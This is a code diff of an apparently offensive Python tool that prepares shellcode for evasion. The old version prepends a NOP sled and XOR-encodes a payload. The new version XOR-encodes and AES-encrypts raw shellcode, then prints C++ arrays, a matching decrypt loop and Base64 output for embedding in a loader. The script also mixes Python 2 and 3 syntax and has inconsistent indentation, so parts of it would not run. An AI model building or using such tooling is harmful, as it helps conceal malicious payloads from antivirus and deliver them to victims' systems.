@@ -1,48 +1,128 @@
-import sys, os, random, string
+#!/usr/bin/python
+
+import argparse
+from Crypto.Hash import MD5
+from Crypto.Cipher import AES
+import pyscrypt
+from base64 import b64encode
+from os import urandom
+import os
 
 
-def encrypt(originalFile, key):
-    if os.path.exists(originalFile) == False:
-        print("payload doesnt exist")
-        exit
-    payload_len = os.path.getsize(originalFile)
-    if payload_len > 9500:
-        print("error payload is too large")
-        exit 
-    #add NOP sled for ez target
-    # open the payload and save
-    with open(originalFile, 'rb') as pay_content:
-        save = pay_content.read()
-    t = "temp_infile" 
-# add huge nope sled to beggining of new file
-    with open(t, 'wb') as pay_content:
-        pay_content.write(b"\x90"*5382)
-        pay_content.write(save)
-    file = open(t, 'rb')
-# copy input to variable pay_content
-    pay_content = file.read()
-    file.close()
-# delete that unwanted slave file
-    os.system("rm {}".format(t))
-    e = []
-#encrypt using our key 
-    for b in range(len(pay_content)):
-        singlebyte = pay_content[b]
-        for i in range(len(key)):
-            singlebyte = singlebyte ^ ord(key[i])
-        e.append("{:02x}".format(singlebyte))
-#output in format we require
-    o = "unsigned char payload[] = {"
-    count = 0
-    for x in e:
-        if count < len(e)-1:
-            o += "0x{},".format(x)
-        else:
-            o += "0x{}".format(x)
-        count += 1
-    o += "};"
-    print(o)
+# Crypto Functions
+#------------------------------------------------------------------------
+# data as a bytearray
+# key as a string
 
-print("Output:\n\n\n")
-encrypt(sys.argv[1] , 'UsugleidIWJWHWQJYsjdhrbe3yujwhhbvdwHST2Ukwu')
-print("============================")
+def xor(data, key):
+	l = len(key)
+	keyAsInt = map(ord, key)
+	return bytes(bytearray((
+	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
+	)))
+
+#------------------------------------------------------------------------
+
+def pad(s):
+	"""PKCS7 padding"""
+	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+
+#------------------------------------------------------------------------
+def aesEncrypt(clearText, key):
+	"""Encrypts data with the provided key.
+	The returned byte array is as follow:
+	:==============:==================================================:
+	: IV (16bytes) :    Encrypted (data + PKCS7 padding information)  :
+	:==============:==================================================:
+	"""
+
+	# Generate a crypto secure random Initialization Vector
+	iv = urandom(AES.block_size)
+
+	# Perform PKCS7 padding so that clearText is a multiple of the block size
+	clearText = pad(clearText)
+
+	cipher = AES.new(key, AES.MODE_CBC, iv)
+	return iv + cipher.encrypt(bytes(clearText))
+
+# Output Formating
+
+#------------------------------------------------------------------------
+# data as a bytearray
+def formatCPP(data, key, cipherType):
+	shellcode = "\\x"
+	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
+	print 'char encryptedShellcode[] = "' + shellcode +'"'
+
+	print 'char key[] = "' + key +'"'
+
+	print 'char cipherType[] = "' + cipherType + '"'
+	
+
+#------------------------------------------------------------------------
+# data as a bytearray
+def formatB64(data):
+	return b64encode(data)
+
+
+
+# Main Function
+
+if __name__ == '__main__':
+	#------------------------------------------------------------------------
+	# Parse arguments
+	parser = argparse.ArgumentParser()
+	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
+        parser.add_argument("key", help="Key used to transform (XOR or AES encryption) the shellcode")
+	args = parser.parse_args() 
+
+
+	#------------------------------------------------------------------------
+	# Open shellcode file and read all bytes from it
+	try:
+		with open(args.shellcodeFile) as shellcodeFileHandle:
+			shellcodeBytes = bytearray(shellcodeFileHandle.read())
+			shellcodeFileHandle.close()
+			print("[*] Shellcode file [{}] successfully loaded".format(args.shellcodeFile))
+	except IOError:
+		print("[!] Could not open or read file [{}]".format(args.shellcodeFile))
+		quit()
+
+	print("[*] MD5 hash of the initial shellcode: [{}]".format(MD5.new(shellcodeBytes).hexdigest()))
+	print("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes)))
+
+
+	#------------------------------------------------------------------------
+	# Display formated output
+	
+	print("[*] Add to C++ code file")
+	print "\n==================================== XOR C++ Code ====================================\n"
+	masterKey = args.key
+	print("[*] XOR encoding the shellcode with key [{}]".format(masterKey))
+	transformedShellcode = xor(shellcodeBytes, masterKey)
+	cipherType = 'xor'
+	formatCPP(transformedShellcode, masterKey, cipherType)
+
+	print("\n[*] Encrypted XOR shellcode size: [{}] bytes".format(len(transformedShellcode)))
+		
+	print "\n==================================== AES C++ Code ====================================\n"
+	key = pyscrypt.hash(args.key, "saltmegood", 1024, 1, 1, 16)
+	masterKey = formatB64(key)
+	print("[*] AES encrypting the shellcode with 128 bits derived key [{}]".format(masterKey))
+	transformedShellcode = aesEncrypt(shellcodeBytes, key)
+	cipherType = 'aes'
+	formatCPP(transformedShellcode, masterKey, cipherType)
+
+	print("\n[*] Encrypted AES shellcode size: [{}] bytes".format(len(transformedShellcode)))
+
+	print "\n\n================================= C++ Decrypt Code =================================\n"
+	print "int j = 0;\n"
+	print "for (int i = 0; i < sizeof encryptedShellcode; i++) {	\n"
+	print "     if (j == sizeof key - 1) j = 0;	\n"
+	print "     shellcode[i] = encryptedShellcode[i] ^ key[j];	\n"   
+	print "     j++;	\n" 
+	print "}\n"
+
+	print("\n============================= here is the Base64 string bc why not =============================\n")		
+	print formatB64(transformedShellcode)
+	print ""
